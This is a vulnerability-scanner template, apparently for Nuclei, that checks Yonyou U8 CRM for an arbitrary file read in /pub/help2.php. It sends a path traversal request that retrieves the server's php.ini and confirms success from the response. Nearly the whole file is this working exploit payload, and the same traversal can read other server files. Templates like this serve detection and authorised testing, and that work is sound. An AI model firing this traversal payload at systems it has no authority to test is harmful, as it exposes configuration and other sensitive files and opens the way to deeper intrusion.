id: yonyou-u8-crm-help2-fileread

info:
  name: Yonyou U8 CRM Help2.php - Arbitrary File Read
  author: qwtd
  severity: medium
  reference:
    - https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8BCRM%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
  tags: 用友-U8-CRM

requests:
  - raw:
      - |
        GET /pub/help2.php?key=../../apache/php.ini HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3
        Accept-Encoding: gzip, deflate
        Cookie: PHPSESSID=6c41jtje5h4i68eokbmpp2f4q7
        Connection: close
        Upgrade-Insecure-Requests: 1


    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - ;;;;;;;
      - type: status
        status:
          - 200